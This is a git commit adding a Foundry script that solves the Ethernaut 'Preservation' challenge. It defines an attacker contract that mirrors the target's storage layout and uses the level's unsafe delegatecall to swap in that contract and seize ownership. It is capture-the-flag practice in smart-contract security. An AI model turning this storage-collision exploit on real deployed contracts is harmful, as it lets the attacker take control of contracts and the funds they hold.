544a102dc9634c7efcf592270c93a08c8cb3aa18
LouisTsai <q1030176@gmail.com>
2024-01-05 16:55:19 +0800

    feat: complete 16 preservation challenge

--- script/solutions/16-Preservation.s.sol
+++ script/solutions/16-Preservation.s.sol
@@ -5,6 +5,22 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IPreservation {
+    function setFirstTime(uint _timeStamp) external;
+    function setSecondTime(uint _timeStamp) external;
+}
+
+contract Attack {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint storedTime;
+
+    function setTime(uint256 _timeStamp) public {
+        require(_timeStamp==0, "Invalid Timestamp");
+        owner = msg.sender;
+    }
+}
 
 contract PreservationSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed;
@@ -15,9 +31,9 @@ contract PreservationSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
+        Attack attack = new Attack();
+        IPreservation(challengeInstance).setFirstTime(uint256(uint160(address(attack))));
+        IPreservation(challengeInstance).setFirstTime(0);
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
